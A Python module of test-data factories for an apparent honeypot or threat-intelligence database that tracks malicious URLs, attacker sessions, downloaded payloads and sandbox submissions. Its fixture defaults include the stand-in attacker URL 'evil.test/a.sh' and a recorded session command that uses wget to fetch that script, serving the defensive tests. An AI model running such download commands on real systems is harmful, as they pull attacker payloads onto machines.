"""
Test data factories: insert rows with sensible defaults, override any column
with keyword arguments. Tests use these instead of hand-written INSERTs, so a
schema change is fixed in one place.

    insert_url(db, "http://evil.test/a.sh", classification="malicious")
"""

import hashlib
import json
import os

from common.utils import get_domain

TODAY = "2026-01-01"
NOW = "2026-01-01T12:00:00+00:00"


def _insert(db, table, values):
    columns = ", ".join(values)
    placeholders = ", ".join("?" for _ in values)
    return db.execute(f"INSERT INTO {table} ({columns}) VALUES ({placeholders})", tuple(values.values()))


def insert_url(db, url="http://evil.test/a.sh", **overrides):
    """Insert a `urls` row; returns the URL."""
    values = {"url": url, "first_seen": TODAY, "last_seen": TODAY, "domain": get_domain(url)}
    values.update(overrides)
    _insert(db, "urls", values)
    return url


def insert_source(db, url, source="Warden"):
    _insert(db, "url_source", {"url": url, "source": source})


def insert_session(db, session="wget http://evil.test/a.sh", idea_id=None, urls=()):
    """Insert a `sessions` row (and url_session links to `urls`); returns the session hash."""
    session_hash = hashlib.md5(session.encode()).hexdigest()
    _insert(db, "sessions", {"session_hash": session_hash, "session": session, "idea_id": idea_id})
    for url in urls:
        _insert(db, "url_session", {"url": url, "session": session_hash})
    return session_hash


def insert_observation(db, url, source="Warden", honeynet=None, session=None, observed_at=NOW):
    return _insert(db, "observations", {
        "url": url, "source": source, "honeynet": honeynet, "session": session, "observed_at": observed_at,
    }).lastrowid


def insert_discovered(db, url, src_url):
    """Record that `url` was found in the content downloaded from `src_url`."""
    _insert(db, "discovered_urls", {"url": url, "src_url": src_url})


def insert_content(db, data=b"#!/bin/sh\necho test\n", content_dir=None, **overrides):
    """
    Insert a `content` row for `data`; returns its id. When `content_dir` is
    given the payload is also written there (same layout as content_store).
    """
    sha256 = hashlib.sha256(data).hexdigest()
    file_path = overrides.pop("file_path", None)
    if file_path is None:
        if content_dir is not None:
            from common.content_store import write_content_file
            file_path = write_content_file(content_dir, sha256, data)
        else:
            file_path = os.path.join("/nonexistent", sha256)
    values = {
        "sha256": sha256, "file_path": file_path, "file_size": len(data),
        "mime_type": "application/x-sh", "first_seen": NOW,
    }
    values.update(overrides)
    return _insert(db, "content", values).lastrowid


def insert_download(db, url, content_id=None, fetched_at=NOW, change_type=None, **overrides):
    """Insert a `download_observations` row; returns its id."""
    if change_type is None:
        change_type = "initial" if content_id is not None else "unavailable"
    values = {
        "url": url, "content_id": content_id, "fetched_at": fetched_at, "source_ip": "192.0.2.1",
        "status_code": 200 if content_id is not None else None,
        "response_headers": json.dumps({"Content-Type": "application/x-sh"}),
        "change_type": change_type,
    }
    values.update(overrides)
    return _insert(db, "download_observations", values).lastrowid


def insert_classification(db, url, classification="malicious", reason=None, actor="evaluator", **overrides):
    values = {"url": url, "classification": classification, "reason": reason, "actor": actor}
    values.update(overrides)
    return _insert(db, "classification_history", values).lastrowid


def insert_sandbox_submission(db, content_id, sha256, sandbox_name="hybrid_analysis", status="pending", **overrides):
    """Insert a `sandbox_submissions` row; returns its id."""
    values = {"content_id": content_id, "sha256": sha256, "sandbox_name": sandbox_name,
              "submitted_at": NOW, "submitted_by": "alice", "status": status}
    values.update(overrides)
    return _insert(db, "sandbox_submissions", values).lastrowid
